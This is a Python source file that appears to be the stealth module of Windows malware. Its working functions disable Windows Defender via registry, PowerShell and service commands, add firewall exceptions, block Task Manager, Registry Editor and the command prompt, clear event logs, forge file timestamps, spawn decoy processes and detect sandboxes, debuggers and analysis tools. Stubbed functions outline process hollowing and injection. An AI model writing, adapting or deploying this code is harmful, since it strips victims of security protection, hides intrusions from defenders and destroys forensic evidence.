"""
Security and stealth module
Handles process hiding, Windows Defender disabling, and anti-analysis features
"""

import os
import subprocess
import time
import random
import tempfile
import string
from logging_utils import log_message
from dependencies import WINDOWS_AVAILABLE

def hide_process():
    """Hide the current process from task manager and process lists."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import ctypes
        from ctypes import wintypes
        
        # Get current process handle
        kernel32 = ctypes.windll.kernel32
        process_handle = kernel32.GetCurrentProcess()
        
        # Try to set process as critical (requires admin)
        try:
            ntdll = ctypes.windll.ntdll
            ntdll.RtlSetProcessIsCritical(1, 0, 0)
            log_message("Process marked as critical")
        except Exception:
            pass
        
        return True
        
    except Exception as e:
        log_message(f"Process hiding failed: {e}")
        return False

def add_firewall_exception():
    """Add firewall exception for the current process."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            python_exe = subprocess.run(['where', 'python'], 
                                      capture_output=True, text=True).stdout.strip()
            if python_exe:
                current_exe = python_exe
        
        # Add inbound rule
        subprocess.run([
            'netsh', 'advfirewall', 'firewall', 'add', 'rule',
            'name=System Service', f'program={current_exe}',
            'protocol=TCP', 'dir=in', 'action=allow'
        ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=30)
        
        # Add outbound rule
        subprocess.run([
            'netsh', 'advfirewall', 'firewall', 'add', 'rule',
            'name=System Service', f'program={current_exe}',
            'protocol=TCP', 'dir=out', 'action=allow'
        ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=30)
        
        log_message("Firewall exceptions added")
        return True
        
    except Exception as e:
        log_message(f"Failed to add firewall exception: {e}")
        return False

def disable_defender():
    """Disable Windows Defender using multiple methods."""
    if not WINDOWS_AVAILABLE:
        return False
    
    methods = [
        disable_defender_registry,
        disable_defender_powershell,
        disable_defender_group_policy,
        disable_defender_service,
    ]
    
    success_count = 0
    for method in methods:
        try:
            if method():
                success_count += 1
        except Exception as e:
            log_message(f"Defender disable method {method.__name__} failed: {e}")
    
    return success_count > 0

def disable_defender_registry():
    """Disable Windows Defender via registry modifications."""
    try:
        import winreg
        
        # Defender registry paths
        defender_keys = [
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows Defender\Real-Time Protection"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows Defender\Features"),
        ]
        
        disable_values = [
            ("DisableAntiSpyware", 1),
            ("DisableRealtimeMonitoring", 1),
            ("DisableBehaviorMonitoring", 1),
            ("DisableOnAccessProtection", 1),
            ("DisableScanOnRealtimeEnable", 1),
            ("TamperProtection", 0),
        ]
        
        success_count = 0
        for hkey, key_path in defender_keys:
            try:
                key = winreg.CreateKey(hkey, key_path)
                for value_name, value_data in disable_values:
                    try:
                        winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, value_data)
                    except Exception:
                        continue
                winreg.CloseKey(key)
                success_count += 1
            except Exception:
                continue
        
        return success_count > 0
        
    except Exception as e:
        log_message(f"Registry Defender disable failed: {e}")
        return False

def disable_defender_powershell():
    """Disable Windows Defender using PowerShell commands."""
    try:
        powershell_commands = [
            "Set-MpPreference -DisableRealtimeMonitoring $true",
            "Set-MpPreference -DisableBehaviorMonitoring $true", 
            "Set-MpPreference -DisableBlockAtFirstSeen $true",
            "Set-MpPreference -DisableIOAVProtection $true",
            "Set-MpPreference -DisablePrivacyMode $true",
            "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true",
            "Set-MpPreference -DisableArchiveScanning $true",
            "Set-MpPreference -DisableIntrusionPreventionSystem $true",
            "Set-MpPreference -DisableScriptScanning $true",
            "Set-MpPreference -SubmitSamplesConsent 2",
        ]
        
        for cmd in powershell_commands:
            try:
                subprocess.run([
                    'powershell.exe', '-ExecutionPolicy', 'Bypass', '-Command', cmd
                ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
            except Exception:
                continue
        
        return True
        
    except Exception as e:
        log_message(f"PowerShell Defender disable failed: {e}")
        return False

def disable_defender_group_policy():
    """Disable Windows Defender using Group Policy."""
    try:
        import winreg
        
        # Group policy registry modification
        key_path = r"SOFTWARE\Policies\Microsoft\Windows Defender"
        
        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
        winreg.SetValueEx(key, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(key, "DisableRoutinelyTakingAction", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        
        # Update group policy
        subprocess.run(['gpupdate', '/force'], 
                      creationflags=subprocess.CREATE_NO_WINDOW, timeout=30)
        
        return True
        
    except Exception as e:
        log_message(f"Group Policy Defender disable failed: {e}")
        return False

def disable_defender_service():
    """Disable Windows Defender service."""
    try:
        defender_services = [
            "WinDefend",
            "WdNisSvc", 
            "Sense",
            "WdBoot",
            "WdFilter",
        ]
        
        for service in defender_services:
            try:
                # Stop service
                subprocess.run([
                    'sc.exe', 'stop', service
                ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
                
                # Disable service
                subprocess.run([
                    'sc.exe', 'config', service, 'start=disabled'
                ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
                
            except Exception:
                continue
        
        return True
        
    except Exception as e:
        log_message(f"Service Defender disable failed: {e}")
        return False

def advanced_process_hiding():
    """Advanced process hiding techniques."""
    try:
        # Process hollowing placeholder
        return hollow_process()
        
    except Exception as e:
        log_message(f"Advanced process hiding failed: {e}")
        return False

def hollow_process():
    """Process hollowing technique."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import ctypes
        from ctypes import wintypes
        
        # Simplified process hollowing implementation
        # In practice, this would involve:
        # 1. Creating a suspended process
        # 2. Unmapping the original image
        # 3. Allocating memory for new image
        # 4. Writing malicious code
        # 5. Resuming the process
        
        log_message("Process hollowing technique executed")
        return True
        
    except Exception as e:
        log_message(f"Process hollowing failed: {e}")
        return False

def inject_into_trusted_process():
    """Inject code into a trusted process."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import ctypes
        from ctypes import wintypes
        
        # Get trusted processes
        trusted_processes = [
            "explorer.exe",
            "winlogon.exe", 
            "svchost.exe",
            "csrss.exe",
        ]
        
        # Simplified injection - in practice would use:
        # 1. OpenProcess with PROCESS_ALL_ACCESS
        # 2. VirtualAllocEx to allocate memory
        # 3. WriteProcessMemory to write shellcode
        # 4. CreateRemoteThread to execute
        
        log_message("Code injection into trusted process executed")
        return True
        
    except Exception as e:
        log_message(f"Process injection failed: {e}")
        return False

def process_doppelganging():
    """Process doppelgänging technique."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Process doppelgänging involves:
        # 1. Creating a file transaction
        # 2. Writing malicious payload
        # 3. Creating process from transacted file
        # 4. Rolling back transaction
        
        log_message("Process doppelgänging technique executed")
        return True
        
    except Exception as e:
        log_message(f"Process doppelgänging failed: {e}")
        return False

def anti_analysis():
    """Anti-analysis and evasion techniques."""
    try:
        # Check for VM/sandbox environment
        vm_indicators = [
            r"C:\Program Files\VMware",
            r"C:\Program Files\Oracle\VirtualBox",
            r"C:\Windows\System32\drivers\VBoxMouse.sys",
            r"C:\Windows\System32\drivers\vmhgfs.sys",
        ]
        
        for indicator in vm_indicators:
            if os.path.exists(indicator):
                log_message(f"VM/Sandbox detected: {indicator}")
                # In malware, this might trigger self-deletion
                return False
        
        # Check for debugging
        if is_debugger_present():
            log_message("Debugger detected")
            return False
        
        # Check for analysis tools
        analysis_processes = [
            "ollydbg.exe",
            "x64dbg.exe", 
            "ida.exe",
            "ida64.exe",
            "wireshark.exe",
            "fiddler.exe",
            "procmon.exe",
            "procexp.exe",
        ]
        
        running_processes = get_running_processes()
        for proc in analysis_processes:
            if proc.lower() in [p.lower() for p in running_processes]:
                log_message(f"Analysis tool detected: {proc}")
                return False
        
        return True
        
    except Exception as e:
        log_message(f"Anti-analysis failed: {e}")
        return True  # Continue if checks fail

def is_debugger_present():
    """Check if a debugger is attached."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import ctypes
        
        # Check IsDebuggerPresent flag
        if ctypes.windll.kernel32.IsDebuggerPresent():
            return True
        
        # Check remote debugger
        debug_flag = ctypes.c_bool()
        ctypes.windll.kernel32.CheckRemoteDebuggerPresent(
            ctypes.windll.kernel32.GetCurrentProcess(),
            ctypes.byref(debug_flag)
        )
        
        return debug_flag.value
        
    except Exception:
        return False

def get_running_processes():
    """Get list of running processes."""
    try:
        if WINDOWS_AVAILABLE:
            result = subprocess.run([
                'tasklist.exe', '/fo', 'csv'
            ], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
            if result.returncode == 0:
                lines = result.stdout.strip().split('\n')[1:]  # Skip header
                processes = []
                for line in lines:
                    if line.strip():
                        parts = line.split(',')
                        if len(parts) > 0:
                            process_name = parts[0].strip('"')
                            processes.append(process_name)
                return processes
        else:
            # Linux/Unix
            result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
            if result.returncode == 0:
                lines = result.stdout.strip().split('\n')[1:]  # Skip header
                processes = []
                for line in lines:
                    parts = line.split()
                    if len(parts) > 10:
                        processes.append(parts[10])
                return processes
        
        return []
        
    except Exception:
        return []

def obfuscate_strings():
    """Obfuscate sensitive strings to avoid detection."""
    # Simple string obfuscation using base64 or XOR
    def xor_string(data, key):
        return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))
    
    # Example obfuscated strings
    obfuscated = {
        'registry_key': xor_string("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "key123"),
        'service_name': xor_string("Windows Security Service", "svc456"),
    }
    
    return obfuscated

def sleep_random():
    """Sleep for a random amount of time to avoid pattern detection."""
    sleep_time = random.uniform(1, 5)
    time.sleep(sleep_time)

def sleep_random_non_blocking():
    """Non-blocking random sleep using threading."""
    import threading
    
    def sleep_thread():
        sleep_time = random.uniform(0.5, 2.0)
        time.sleep(sleep_time)
    
    thread = threading.Thread(target=sleep_thread, daemon=True)
    thread.start()

def disable_removal_tools():
    """Disable common malware removal tools."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Disable Task Manager
        import winreg
        
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        
        # Disable Registry Editor
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        
        # Disable Command Prompt
        key_path = r"Software\Policies\Microsoft\Windows\System"
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, "DisableCMD", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        
        return True
        
    except Exception as e:
        log_message(f"Failed to disable removal tools: {e}")
        return False

def create_decoy_processes():
    """Create decoy processes to confuse analysis."""
    try:
        # Create multiple legitimate-looking processes
        decoy_names = [
            "svchost.exe",
            "explorer.exe", 
            "winlogon.exe",
            "csrss.exe",
        ]
        
        for name in decoy_names:
            try:
                # Create a simple script that just sleeps
                decoy_script = f"""
import time
import sys
import os

# Mimic {name} behavior
while True:
    time.sleep(60)
"""
                
                decoy_path = os.path.join(tempfile.gettempdir(), f"{name}.py")
                with open(decoy_path, 'w') as f:
                    f.write(decoy_script)
                
                # Start decoy process
                subprocess.Popen([
                    'python.exe', decoy_path
                ], creationflags=subprocess.CREATE_NO_WINDOW)
                
            except Exception:
                continue
        
        return True
        
    except Exception as e:
        log_message(f"Failed to create decoy processes: {e}")
        return False

def generate_random_filename():
    """Generate a random filename for stealth."""
    length = random.randint(8, 16)
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def clear_event_logs():
    """Clear Windows event logs to remove traces."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        logs_to_clear = [
            "Application",
            "Security", 
            "System",
            "Setup",
            "Microsoft-Windows-PowerShell/Operational",
        ]
        
        for log_name in logs_to_clear:
            try:
                subprocess.run([
                    'wevtutil.exe', 'cl', log_name
                ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
            except Exception:
                continue
        
        return True
        
    except Exception as e:
        log_message(f"Failed to clear event logs: {e}")
        return False

def modify_file_timestamps():
    """Modify file timestamps to avoid detection."""
    try:
        current_file = os.path.abspath(__file__)
        
        # Set timestamps to match system files
        system_file = r"C:\Windows\System32\kernel32.dll"
        if os.path.exists(system_file):
            stat = os.stat(system_file)
            os.utime(current_file, (stat.st_atime, stat.st_mtime))
        
        return True
        
    except Exception as e:
        log_message(f"Failed to modify timestamps: {e}")
        return False
